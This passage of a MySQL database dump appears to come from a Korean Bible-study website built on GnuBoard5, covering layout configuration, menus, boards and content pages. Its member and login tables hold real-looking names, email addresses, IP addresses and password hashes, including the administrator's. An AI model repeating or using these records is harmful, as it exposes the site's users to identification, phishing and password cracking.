센타','','','','','','','/bbs/board.php?bo_table=notice','/bbs/board.php?bo_table=qna','/bbs/board.php?bo_table=faq','/bbs/board.php?bo_table=callcenter','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','checked','','','','','checked','checked','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','latest(\"good_webzine_main\", \"gallery_main_ad\", 1, 48)','latest(\"good_basic\", \"notice\", 4, 32)','latest(\"good_basic\", \"free\", 4, 32)','latest(\"good_gallery\", \"gallery1\", 3, 48)','latest(\"good_webzine\", \"gallery2\", 2, 48)','latest(\"good_basic\", \"blog\", 4, 32)','latest(\"good_basic\", \"qna\", 4, 32)','latest(\"good_gallery\", \"gallery1\", 2, 48)','latest(\"good_webzine\", \"gallery2\", 1, 48)','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','sideBoxGN','sideBoxGN','sideBoxGN','sideBoxGN','sideBoxGN','sideBoxGN','sideBoxGN','sideBoxGN','sideBoxGN','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','checked','','','checked','checked','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','checked','','','','','','','','','','','','','sidemenu(\"good_basic\")','outlogin(\"good_basic\")','outsearch(\"good_basic\")','popular(\"good_basic\")','visit(\"good_basic\")','poll(\"good_basic\")','connect(\"good_basic\")','outnew(\"good_basic\")','','','','','','','','','','','','','sideBox2N','sideBox2N','searchBox2N','sideBox2N','sideBox2N','sideBox2N','sideBox2N','sideBox2N','','','','','','','','','','','','','','','','','','','checked','checked','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','',''),(3,'basic_biz','사이트 이름','상호명: 회사 이름 주소: 회사 주소','Copyright (c) 2010 All Rights Reserved.','사이트 키워드들','사이트에 대한 설명','basic',10,10,960,760,0,200,0,0,30,15,15,5,5,'홈','소개','서비스','게시판','블로그','고객 센타','','','','',0,140,140,140,140,140,0,0,0,0,'/','/module/subpage/index.php?p=about','/module/subpage/index.php?p=work1','/bbs/board.php?bo_table=free','/bbs/board.php?bo_table=blog','/bbs/board.php?bo_table=notice','','','','','','','','','','','','','','','','','','','','','','','','','인사말','연혁','약력','오시는 길','','','','','','','/module/subpage/index.php?p=about','/module/subpage/index.php?p=history','/module/subpage/index.php?p=career','/module/subpage/index.php?p=map','','','','','','','서비스 내용1','서비스 내용2','','','','','','','','','/module/subpage/index.php?p=work1','/module/subpage/index.php?p=work2','','','','','','','','','자유 게시판','갤러리1','갤러리2','','','','','','','','/bbs/board.php?bo_table=free','/bbs/board.php?bo_table=gallery1','/bbs/board.php?bo_table=gallery2','','','','','','','','멤버 블로그','','','','','','','','','','/bbs/board.php?bo_table=blog','','','','','','','','','','공지 사항','질문 답변','FAQ','콜 센타','','','','','','','/bbs/board.php?bo_table=notice','/bbs/board.php?bo_table=qna','/bbs/board.php?bo_table=faq','/bbs/board.php?bo_table=callcenter','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','',''),(4,'basic_biz_easy','사이트 이름','상호명: 회사 이름 주소: 회사 주소','Copyright (c) 2010 All Rights Reserved.','사이트 키워드들','사이트에 대한 설명','basic',10,10,960,760,0,200,0,0,30,15,15,5,5,'홈','소개','서비스','게시판','블로그','고객 센타','','','','',80,140,140,140,140,140,0,0,0,0,'/','/bbs/board.php?bo_table=intro','/bbs/board.php?bo_table=service','/bbs/board.php?bo_table=free','/bbs/board.php?bo_table=blog','/bbs/board.php?bo_table=notice','','','','','','','','','','','','','','','','','','','','','','','','','인사말','연혁','약력','오시는 길','','','','','','','/bbs/board.php?bo_table=intro&wr_id=1','/bbs/board.php?bo_table=intro&wr_id=2','/bbs/board.php?bo_table=intro&wr_id=3','/bbs/board.php?bo_table=intro&wr_id=4','','','','','','','서비스 내용1','서비스 내용2','','','','','','','','','/bbs/board.php?bo_table=service&wr_id=1','/bbs/board.php?bo_table=service&wr_id=2','','','','','','','','','자유 게시판','갤러리1','갤러리2','','','','','','','','/bbs/board.php?bo_table=free','/bbs/board.php?bo_table=gallery1','/bbs/board.php?bo_table=gallery2','','','','','','','','멤버 블로그','','','','','','','','','','/bbs/board.php?bo_table=blog','','','','','','','','','','공지 사항','질문 답변','FAQ','콜 센타','','','','','','','/bbs/board.php?bo_table=notice','/bbs/board.php?bo_table=qna','/bbs/board.php?bo_table=faq','/bbs/board.php?bo_table=callcenter','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','',''),(5,'basic_g5','사이트 이름','상호명: 회사 이름 주소: 회사 주소','Copyright (c) 2010 All Rights Reserved.','사이트 키워드들','사이트에 대한 설명','basic',10,10,960,760,0,200,0,0,30,15,15,5,5,'홈','소개','서비스','게시판','블로그','고객 센타','','','','',80,140,140,140,140,140,0,0,0,0,'/','/bbs/board.php?bo_table=intro','/bbs/board.php?bo_table=service','/bbs/board.php?bo_table=free','/bbs/board.php?bo_table=blog','/bbs/board.php?bo_table=notice','','','','','','','','','','','','','','','','','','','','','','','','','인사말','연혁','약력','오시는 길','','','','','','','/bbs/board.php?bo_table=intro&wr_id=1','/bbs/board.php?bo_table=intro&wr_id=2','/bbs/board.php?bo_table=intro&wr_id=3','/bbs/board.php?bo_table=intro&wr_id=4','','','','','','','서비스 내용1','서비스 내용2','','','','','','','','','/bbs/board.php?bo_table=service&wr_id=1','/bbs/board.php?bo_table=service&wr_id=2','','','','','','','','','자유 게시판','갤러리1','갤러리2','','','','','','','','/bbs/board.php?bo_table=free','/bbs/board.php?bo_table=gallery1','/bbs/board.php?bo_table=gallery2','','','','','','','','멤버 블로그','','','','','','','','','','/bbs/board.php?bo_table=blog','','','','','','','','','','공지 사항','질문 답변','FAQ','콜 센타','','','','','','','/bbs/board.php?bo_table=notice','/bbs/board.php?bo_table=qna','/bbs/board.php?bo_table=faq','/bbs/board.php?bo_table=callcenter','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','',''),(20,'boot_basic','사이트 이름','상호명: 회사 이름 주소: 회사 주소','Copyright (c) 2010 All Rights Reserved.','사이트 키워드들','사이트에 대한 설명','basic',10,10,960,760,0,200,0,0,30,15,15,5,5,'홈','소개','서비스','게시판','블로그','고객 센타','','','','',80,140,140,140,140,140,0,0,0,0,'/','/bbs/board.php?bo_table=intro','/bbs/board.php?bo_table=service','/bbs/board.php?bo_table=free','/bbs/board.php?bo_table=blog','/bbs/board.php?bo_table=notice','','','','','','','','','','','','','','','','','','','','','','','','','인사말','연혁','약력','오시는 길','','','','','','','/bbs/board.php?bo_table=intro&wr_id=1','/bbs/board.php?bo_table=intro&wr_id=2','/bbs/board.php?bo_table=intro&wr_id=3','/bbs/board.php?bo_table=intro&wr_id=4','','','','','','','서비스 내용1','서비스 내용2','','','','','','','','','/bbs/board.php?bo_table=service&wr_id=1','/bbs/board.php?bo_table=service&wr_id=2','','','','','','','','','자유 게시판','갤러리1','갤러리2','','','','','','','','/bbs/board.php?bo_table=free','/bbs/board.php?bo_table=gallery1','/bbs/board.php?bo_table=gallery2','','','','','','','','멤버 블로그','','','','','','','','','','/bbs/board.php?bo_table=blog','','','','','','','','','','공지 사항','질문 답변','FAQ','1:1문의','콜 센타','','','','','','/bbs/board.php?bo_table=notice','/bbs/board.php?bo_table=qna','/bbs/faq.php','/bbs/qalist.php','/bbs/board.php?bo_table=callcenter','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','checked','','','','','checked','checked','checked','checked','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','latest(\"good_webzine_full\", \"gallery_main_ad\", 1, 48)','latest(\"good_boot_basic\", \"notice\", 4, 32)','latest(\"good_boot_basic\", \"free\", 4, 32)','latest(\"good_boot_basic\", \"gallery1\", 3, 32)','latest(\"good_boot_basic\", \"gallery2\", 2, 32)','latest(\"good_boot_basic\", \"blog\", 4, 32)','latest(\"good_boot_basic\", \"qna\", 4, 32)','latest(\"good_boot_basic\", \"gallery1\", 2, 32)','latest(\"good_boot_basic\", \"gallery2\", 1, 32)','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','checked','','','','','','','checked','checked','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','checked','checked','checked','checked','checked','checked','checked','checked','','','','','','','','','','','','','sidemenu(\"good_basic\")','outlogin(\"good_basic\")','outsearch(\"good_basic\")','popular(\"good_basic\")','visit(\"good_basic\")','poll(\"good_basic\")','connect(\"good_basic\")','outnew(\"good_basic\")','','','','','','','','','','','','','sideBox2N','sideBox2N','searchBox2N','sideBox2N','sideBox2N','sideBox2N','sideBox2N','sideBox2N','','','','','','','','','','','','','','','','','','','checked','checked','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_config2w` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_config2w_m`
--

DROP TABLE IF EXISTS `g5_config2w_m`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_config2w_m` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `cf_id` varchar(30) NOT NULL DEFAULT '',
  `cf_templete` varchar(30) NOT NULL DEFAULT 'basic',
  `cf_search` varchar(30) NOT NULL DEFAULT 'nouse',
  `cf_menu` varchar(30) NOT NULL DEFAULT 'list',
  `cf_main_image` varchar(30) NOT NULL DEFAULT 'nouse',
  PRIMARY KEY (`id`),
  UNIQUE KEY `cf_id` (`cf_id`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_config2w_m`
--

LOCK TABLES `g5_config2w_m` WRITE;
/*!40000 ALTER TABLE `g5_config2w_m` DISABLE KEYS */;
INSERT INTO `g5_config2w_m` VALUES (1,'basic','basic','nouse','list','nouse'),(4,'basic_g5','basic','nouse','list','nouse'),(5,'basic_webzine','basic','nouse','list','nouse');
/*!40000 ALTER TABLE `g5_config2w_m` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_content`
--

DROP TABLE IF EXISTS `g5_content`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_content` (
  `co_id` varchar(20) NOT NULL DEFAULT '',
  `co_html` tinyint(4) NOT NULL DEFAULT '0',
  `co_subject` varchar(255) NOT NULL DEFAULT '',
  `co_content` longtext NOT NULL,
  `co_mobile_content` longtext NOT NULL,
  `co_skin` varchar(255) NOT NULL DEFAULT '',
  `co_mobile_skin` varchar(255) NOT NULL DEFAULT '',
  `co_tag_filter_use` tinyint(4) NOT NULL DEFAULT '0',
  `co_hit` int(11) NOT NULL DEFAULT '0',
  `co_include_head` varchar(255) NOT NULL,
  `co_include_tail` varchar(255) NOT NULL,
  PRIMARY KEY (`co_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_content`
--

LOCK TABLES `g5_content` WRITE;
/*!40000 ALTER TABLE `g5_content` DISABLE KEYS */;
INSERT INTO `g5_content` VALUES ('intro',1,'소개','<p>성경을 제대로 배워 봅시다!!~</p>','<p><span style=\"line-height: 1.5;\">성경을 제대로 배워 봅시다!!~</span><span style=\"line-height: 1.5;\">​</span></p>','basic','basic',0,0,'',''),('privacy',1,'개인정보 처리방침','<p align=center><b>개인정보 처리방침에 대한 내용을 입력하십시오.</b></p>','','','',0,0,'',''),('provision',1,'서비스 이용약관','<p align=center><b>서비스 이용약관에 대한 내용을 입력하십시오.</b></p>','','','',0,0,'','');
/*!40000 ALTER TABLE `g5_content` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_faq`
--

DROP TABLE IF EXISTS `g5_faq`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_faq` (
  `fa_id` int(11) NOT NULL AUTO_INCREMENT,
  `fm_id` int(11) NOT NULL DEFAULT '0',
  `fa_subject` text NOT NULL,
  `fa_content` text NOT NULL,
  `fa_order` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`fa_id`),
  KEY `fm_id` (`fm_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_faq`
--

LOCK TABLES `g5_faq` WRITE;
/*!40000 ALTER TABLE `g5_faq` DISABLE KEYS */;
/*!40000 ALTER TABLE `g5_faq` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_faq_master`
--

DROP TABLE IF EXISTS `g5_faq_master`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_faq_master` (
  `fm_id` int(11) NOT NULL AUTO_INCREMENT,
  `fm_subject` varchar(255) NOT NULL DEFAULT '',
  `fm_head_html` text NOT NULL,
  `fm_tail_html` text NOT NULL,
  `fm_mobile_head_html` text NOT NULL,
  `fm_mobile_tail_html` text NOT NULL,
  `fm_order` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`fm_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_faq_master`
--

LOCK TABLES `g5_faq_master` WRITE;
/*!40000 ALTER TABLE `g5_faq_master` DISABLE KEYS */;
INSERT INTO `g5_faq_master` VALUES (1,'자주하시는 질문','','','','',0);
/*!40000 ALTER TABLE `g5_faq_master` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_group`
--

DROP TABLE IF EXISTS `g5_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_group` (
  `gr_id` varchar(10) NOT NULL DEFAULT '',
  `gr_subject` varchar(255) NOT NULL DEFAULT '',
  `gr_device` enum('both','pc','mobile') NOT NULL DEFAULT 'both',
  `gr_admin` varchar(255) NOT NULL DEFAULT '',
  `gr_use_access` tinyint(4) NOT NULL DEFAULT '0',
  `gr_order` int(11) NOT NULL DEFAULT '0',
  `gr_1_subj` varchar(255) NOT NULL DEFAULT '',
  `gr_2_subj` varchar(255) NOT NULL DEFAULT '',
  `gr_3_subj` varchar(255) NOT NULL DEFAULT '',
  `gr_4_subj` varchar(255) NOT NULL DEFAULT '',
  `gr_5_subj` varchar(255) NOT NULL DEFAULT '',
  `gr_6_subj` varchar(255) NOT NULL DEFAULT '',
  `gr_7_subj` varchar(255) NOT NULL DEFAULT '',
  `gr_8_subj` varchar(255) NOT NULL DEFAULT '',
  `gr_9_subj` varchar(255) NOT NULL DEFAULT '',
  `gr_10_subj` varchar(255) NOT NULL DEFAULT '',
  `gr_1` varchar(255) NOT NULL DEFAULT '',
  `gr_2` varchar(255) NOT NULL DEFAULT '',
  `gr_3` varchar(255) NOT NULL DEFAULT '',
  `gr_4` varchar(255) NOT NULL DEFAULT '',
  `gr_5` varchar(255) NOT NULL DEFAULT '',
  `gr_6` varchar(255) NOT NULL DEFAULT '',
  `gr_7` varchar(255) NOT NULL DEFAULT '',
  `gr_8` varchar(255) NOT NULL DEFAULT '',
  `gr_9` varchar(255) NOT NULL DEFAULT '',
  `gr_10` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`gr_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_group`
--

LOCK TABLES `g5_group` WRITE;
/*!40000 ALTER TABLE `g5_group` DISABLE KEYS */;
INSERT INTO `g5_group` VALUES ('_docs','기타문서','both','webmanager',0,0,'','','','','','','','','','','','','','','','','','','',''),('_words','말씀','both','',0,0,'','','','','','','','','','','','','','','','','','','',''),('_mission','인터넷 선교','both','webmanager',0,0,'','','','','','','','','','','','','','','','','','','',''),('_lecture','강의','both','',0,0,'','','','','','','','','','','','','','','','','','','',''),('_reference','참고 자료','both','',0,0,'','','','','','','','','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_group` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_group_member`
--

DROP TABLE IF EXISTS `g5_group_member`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_group_member` (
  `gm_id` int(11) NOT NULL AUTO_INCREMENT,
  `gr_id` varchar(255) NOT NULL DEFAULT '',
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `gm_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`gm_id`),
  KEY `gr_id` (`gr_id`),
  KEY `mb_id` (`mb_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_group_member`
--

LOCK TABLES `g5_group_member` WRITE;
/*!40000 ALTER TABLE `g5_group_member` DISABLE KEYS */;
/*!40000 ALTER TABLE `g5_group_member` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_login`
--

DROP TABLE IF EXISTS `g5_login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_login` (
  `lo_ip` varchar(255) NOT NULL DEFAULT '',
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `lo_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `lo_location` text NOT NULL,
  `lo_url` text NOT NULL,
  PRIMARY KEY (`lo_ip`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_login`
--

LOCK TABLES `g5_login` WRITE;
/*!40000 ALTER TABLE `g5_login` DISABLE KEYS */;
INSERT INTO `g5_login` VALUES ('1.11.144.43','admin','2015-09-08 07:12:01','게시판관리',''),('14.37.188.23','','2015-09-08 07:09:15','Realize Bible','/');
/*!40000 ALTER TABLE `g5_login` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_mail`
--

DROP TABLE IF EXISTS `g5_mail`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_mail` (
  `ma_id` int(11) NOT NULL AUTO_INCREMENT,
  `ma_subject` varchar(255) NOT NULL DEFAULT '',
  `ma_content` mediumtext NOT NULL,
  `ma_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ma_ip` varchar(255) NOT NULL DEFAULT '',
  `ma_last_option` text NOT NULL,
  PRIMARY KEY (`ma_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_mail`
--

LOCK TABLES `g5_mail` WRITE;
/*!40000 ALTER TABLE `g5_mail` DISABLE KEYS */;
/*!40000 ALTER TABLE `g5_mail` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_member`
--

DROP TABLE IF EXISTS `g5_member`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_member` (
  `mb_no` int(11) NOT NULL AUTO_INCREMENT,
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `mb_password` varchar(255) NOT NULL DEFAULT '',
  `mb_name` varchar(255) NOT NULL DEFAULT '',
  `mb_nick` varchar(255) NOT NULL DEFAULT '',
  `mb_nick_date` date NOT NULL DEFAULT '0000-00-00',
  `mb_email` varchar(255) NOT NULL DEFAULT '',
  `mb_homepage` varchar(255) NOT NULL DEFAULT '',
  `mb_level` tinyint(4) NOT NULL DEFAULT '0',
  `mb_sex` char(1) NOT NULL DEFAULT '',
  `mb_birth` varchar(255) NOT NULL DEFAULT '',
  `mb_tel` varchar(255) NOT NULL DEFAULT '',
  `mb_hp` varchar(255) NOT NULL DEFAULT '',
  `mb_certify` varchar(20) NOT NULL DEFAULT '',
  `mb_adult` tinyint(4) NOT NULL DEFAULT '0',
  `mb_dupinfo` varchar(255) NOT NULL DEFAULT '',
  `mb_zip1` char(3) NOT NULL DEFAULT '',
  `mb_zip2` char(3) NOT NULL DEFAULT '',
  `mb_addr1` varchar(255) NOT NULL DEFAULT '',
  `mb_addr2` varchar(255) NOT NULL DEFAULT '',
  `mb_addr3` varchar(255) NOT NULL DEFAULT '',
  `mb_addr_jibeon` varchar(255) NOT NULL DEFAULT '',
  `mb_signature` text NOT NULL,
  `mb_recommend` varchar(255) NOT NULL DEFAULT '',
  `mb_point` int(11) NOT NULL DEFAULT '0',
  `mb_today_login` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `mb_login_ip` varchar(255) NOT NULL DEFAULT '',
  `mb_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `mb_ip` varchar(255) NOT NULL DEFAULT '',
  `mb_leave_date` varchar(8) NOT NULL DEFAULT '',
  `mb_intercept_date` varchar(8) NOT NULL DEFAULT '',
  `mb_email_certify` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `mb_memo` text NOT NULL,
  `mb_lost_certify` varchar(255) NOT NULL,
  `mb_mailling` tinyint(4) NOT NULL DEFAULT '0',
  `mb_sms` tinyint(4) NOT NULL DEFAULT '0',
  `mb_open` tinyint(4) NOT NULL DEFAULT '0',
  `mb_open_date` date NOT NULL DEFAULT '0000-00-00',
  `mb_profile` text NOT NULL,
  `mb_memo_call` varchar(255) NOT NULL DEFAULT '',
  `mb_1` varchar(255) NOT NULL DEFAULT '',
  `mb_2` varchar(255) NOT NULL DEFAULT '',
  `mb_3` varchar(255) NOT NULL DEFAULT '',
  `mb_4` varchar(255) NOT NULL DEFAULT '',
  `mb_5` varchar(255) NOT NULL DEFAULT '',
  `mb_6` varchar(255) NOT NULL DEFAULT '',
  `mb_7` varchar(255) NOT NULL DEFAULT '',
  `mb_8` varchar(255) NOT NULL DEFAULT '',
  `mb_9` varchar(255) NOT NULL DEFAULT '',
  `mb_10` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`mb_no`),
  UNIQUE KEY `mb_id` (`mb_id`),
  KEY `mb_today_login` (`mb_today_login`),
  KEY `mb_datetime` (`mb_datetime`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_member`
--

LOCK TABLES `g5_member` WRITE;
/*!40000 ALTER TABLE `g5_member` DISABLE KEYS */;
INSERT INTO `g5_member` VALUES (1,'admin','*43B6A753E947CC40233137718E1732A086F38386','최고관리자','최고관리자','0000-00-00','admin@domain.com','',10,'','','','','',0,'','','','','','','','','',2300,'2015-09-08 07:10:27','1.11.144.43','2015-02-11 22:04:37','::1','','','2015-02-11 22:04:37','','',1,0,1,'0000-00-00','','','','','','','','','','','',''),(2,'webmanager','*457A703CCA1D0C92DB477BA44E1246F6639F96CD','주관리','웹 메니져','0000-00-00','webmanager@jubinna.or.kr','',4,'','','','','',0,'','','','','','','','','',2000,'2015-07-14 12:37:18','::1','2015-02-12 15:31:08','210.216.54.2','','','2015-02-12 15:31:08','','',1,0,1,'0000-00-00','','','','','','','','','','','',''),(3,'user01','*C8B27DECB94F864D2395C39D43F5FCA5F82CD447','아무개','생신입','0000-00-00','abc@nate.com','',1,'','','','','',0,'','','','','','','','','',100,'2015-02-12 16:07:35','210.216.54.2','2015-02-12 16:05:50','210.216.54.2','','','2015-02-12 16:05:50','','',1,0,1,'0000-00-00','','','','','','','','','','','',''),(4,'member01','*6D26A488750B9984E064FFC0DF115214A0566953','나회원','주의신부','0000-00-00','asdf@nate.com','',2,'','','','','',0,'','','','','','','','','',400,'2015-02-22 12:26:55','110.70.52.139','2015-02-12 16:07:19','210.216.54.2','','','2015-02-12 16:07:19','','',1,0,1,'0000-00-00','','','','','','','','','','','',''),(5,'charles','*260AC7F03ECFE365098F9FA273CFF077A12C8229','고재철','완전재철','2015-06-03','charles@jubinna.com','',2,'','','','','',0,'','','','','','','','','',1000,'2015-06-03 17:02:30','210.216.54.2','2015-06-03 17:02:30','210.216.54.2','','','2015-06-03 17:02:30','','',1,0,1,'2015-06-03','','','','','','','','','','','',''),(6,'miclecho00','*15618B615E198F9283D38DB46B93A6A4B0D162AF','조현호','주하늘','2015-08-26','yesman74@naver.com','',2,'','','','','',0,'','','','','','','','','',1000,'2015-08-26 06:22:01','112.221.70.75','2015-08-26 06:22:01','112.221.70.75','','','2015-08-26 06:22:01','','',1,0,1,'2015-08-26','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_member` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_memo`
--

DROP TABLE IF EXISTS `g5_memo`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_memo` (
  `me_id` int(11) NOT NULL DEFAULT '0',
  `me_recv_mb_id` varchar(20) NOT NULL DEFAULT '',
  `me_send_mb_id` varchar(20) NOT NULL DEFAULT '',
  `me_send_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `me_read_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `me_memo` text NOT NULL,
  PRIMARY KEY (`me_id`),
  KEY `me_recv_mb_id` (`me_recv_mb_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_memo`
--

LOCK TABLES `g5_memo` WRITE;
/*!40000 ALTER TABLE `g5_memo` DISABLE KEYS */;
/*!40000 ALTER TABLE `g5_memo` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_menu`
--

DROP TABLE IF EXISTS `g5_menu`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_menu` (
  `me_id` int(11) NOT NULL AUTO_INCREMENT,
  `me_code` varchar(255) NOT NULL DEFAULT '',
  `me_name` varchar(255) NOT NULL DEFAULT '',
  `me_link` varchar(255) NOT NULL DEFAULT '',
  `me_target` varchar(255) NOT NULL DEFAULT '',
  `me_order` int(11) NOT NULL DEFAULT '0',
  `me_use` tinyint(4) NOT NULL DEFAULT '0',
  `me_mobile_use` tinyint(4) NOT NULL DEFAULT '0',
  PRIMARY KEY (`me_id`)
) ENGINE=MyISAM AUTO_INCREMENT=177 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

